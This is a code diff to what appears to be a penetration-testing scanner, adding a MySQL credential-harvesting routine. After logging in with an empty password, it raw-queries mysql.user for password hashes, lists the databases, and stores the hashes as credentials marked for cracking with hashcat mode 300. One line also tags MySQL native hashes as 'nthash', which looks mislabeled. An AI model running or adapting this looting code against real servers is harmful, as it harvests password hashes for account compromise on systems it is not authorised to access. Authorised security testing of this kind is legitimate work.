@@ -138,6 +138,94 @@ def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
     return res
 
 
+def _lenenc_int(buf: bytes, off: int):
+    b = buf[off]
+    if b < 0xFB:
+        return b, off + 1
+    if b == 0xFC:
+        return int.from_bytes(buf[off + 1:off + 3], "little"), off + 3
+    if b == 0xFD:
+        return int.from_bytes(buf[off + 1:off + 4], "little"), off + 4
+    if b == 0xFE:
+        return int.from_bytes(buf[off + 1:off + 9], "little"), off + 9
+    return 0, off + 1
+
+
+def _lenenc_str(buf: bytes, off: int):
+    if off >= len(buf):
+        return "", off
+    if buf[off] == 0xFB:                         # NULL
+        return None, off + 1
+    n, off = _lenenc_int(buf, off)
+    return buf[off:off + n].decode("utf-8", "replace"), off + n
+
+
+def _is_eof(payload: bytes) -> bool:
+    return payload[:1] == b"\xfe" and len(payload) < 9
+
+
+def _query(sock: socket.socket, sql: str) -> list[list]:
+    """COM_QUERY -> parsed rows (list of list of str|None). Read-only, no CLIENT_DEPRECATE_EOF
+    so column defs are terminated by an EOF packet."""
+    pkt = b"\x03" + sql.encode()                 # 0x03 = COM_QUERY
+    sock.sendall(struct.pack("<I", len(pkt))[:3] + b"\x00" + pkt)
+    first, _ = _read_packet(sock)
+    if not first or first[:1] in (b"\x00", b"\xff"):     # OK / ERR -> no result set
+        return []
+    ncol, _ = _lenenc_int(first, 0)
+    for _ in range(min(ncol, 512)):              # skip column-definition packets
+        _read_packet(sock)
+    after_cols, _ = _read_packet(sock)           # EOF after columns
+    rows: list[list] = []
+    pending = None if (after_cols is None or _is_eof(after_cols)) else after_cols
+    for _ in range(100000):
+        p = pending or (_read_packet(sock)[0])
+        pending = None
+        if p is None or _is_eof(p) or p[:1] == b"\xff":
+            break
+        off, row = 0, []
+        for _c in range(ncol):
+            v, off = _lenenc_str(p, off)
+            row.append(v)
+        rows.append(row)
+    return rows
+
+
+def loot(ip: str, port: int, user: str = "root", timeout: float = _TIMEOUT) -> dict:
+    """Empty-password login confirmed -> pull read-only loot: user table (with the
+    authentication_string password HASHES) and the database list. SELECT only."""
+    out = {"users": [], "databases": [], "hashes": []}
+    try:
+        sock = socket.create_connection((ip, port), timeout=timeout)
+        sock.settimeout(timeout)
+    except OSError:
+        return out
+    try:
+        payload, seq = _read_packet(sock)
+        if not payload or payload[0] != 10:
+            return out
+        resp = _handshake_response(user)
+        sock.sendall(struct.pack("<I", len(resp))[:3] + bytes([seq + 1]) + resp)
+        reply, _ = _read_packet(sock)
+        if not reply or reply[0] != 0x00:        # not authenticated
+            return out
+        for r in _query(sock, "SELECT user, host, authentication_string, plugin "
+                              "FROM mysql.user"):
+            u, host, ash, plugin = (r + [None] * 4)[:4]
+            out["users"].append({"user": u, "host": host, "plugin": plugin})
+            if ash:
+                out["hashes"].append({"user": u, "host": host, "hash": ash, "plugin": plugin})
+        out["databases"] = [r[0] for r in _query(sock, "SHOW DATABASES")]
+    except OSError:
+        pass
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+    return out
+
+
 def mysql_targets(hosts: list[Host]) -> list[dict]:
     out = []
     for h in hosts:
@@ -167,11 +255,24 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             if pr.get("unauth"):
                 who = pr.get("user") or "root"
                 ver = pr.get("version") or ""
+                lt = pr.get("loot") or {}
+                loot_txt = ""
+                if lt:
+                    dbs = [d for d in lt.get("databases", [])
+                           if d not in ("information_schema", "performance_schema", "sys", "mysql")]
+                    hashes = lt.get("hashes", [])
+                    loot_txt = (
+                        f"\n\nLOOTED (read-only): {len(lt.get('users', []))} account(s), "
+                        f"{len(lt.get('databases', []))} database(s)"
+                        + (f" (non-system: {', '.join(dbs[:8])})" if dbs else "")
+                        + (f"; {len(hashes)} password hash(es) captured (hashcat -m 300) -> "
+                           + ", ".join(f"{h['user']}@{h['host']}" for h in hashes[:6])
+                           if hashes else ""))
                 out.append(_finding(
                     "high", f"MySQL '{who}' login with empty password", tgt,
                     f"The account '{who}' authenticated with an EMPTY password"
                     + (f" (server {ver})" if ver else "")
-                    + " - full database access without a credential.",
+                    + " - full database access without a credential." + loot_txt,
                     f"mysql -h {h.ip} -P {p.portid} -u {who or 'root'}",
                     "Set a strong password on every account (esp. root); remove anonymous "
                     "''@'%' accounts; bind to localhost / a private interface.",
@@ -197,7 +298,9 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
     targets = mysql_targets(hosts)
     probes: dict = {}
     state: dict = {}
+    creds: list = []
     if active:
+        from .models import Credential
         for t, pr in svcprobe.iter_probe(
                 targets, lambda t: probe(t["ip"], t["port"]),
                 budget=budget, progress=progress, state=state):
@@ -206,11 +309,21 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 t["unauth"] = pr.get("unauth", False)
                 t["auth_required"] = pr.get("auth_required", False)
                 t["version"] = pr.get("version", "") or t.get("version", "")
+                if pr.get("unauth"):
+                    pr["loot"] = loot(t["ip"], t["port"], user=pr.get("user") or "root")
+                    for hh in pr["loot"].get("hashes", []):
+                        creds.append(Credential(
+                            username=hh["user"] or "", secret=hh["hash"],
+                            kind="nthash" if (hh.get("plugin") or "").startswith("mysql_native")
+                            else "hash", source="mysql-loot", origin_ip=t["ip"],
+                            notes=f"mysql.user hash ({hh.get('plugin')}) from empty-password "
+                                  f"MySQL :{t['port']} - hashcat -m 300"))
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                 for t in targets]
     return {"targets": targets, "findings": fs, "runbooks": runbooks,
+            "credentials": creds,
             "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
             "stats": {"targets": len(targets), "findings": len(fs),
-                      "stopped": state.get("stopped")}}
+                      "credentials": len(creds), "stopped": state.get("stopped")}}
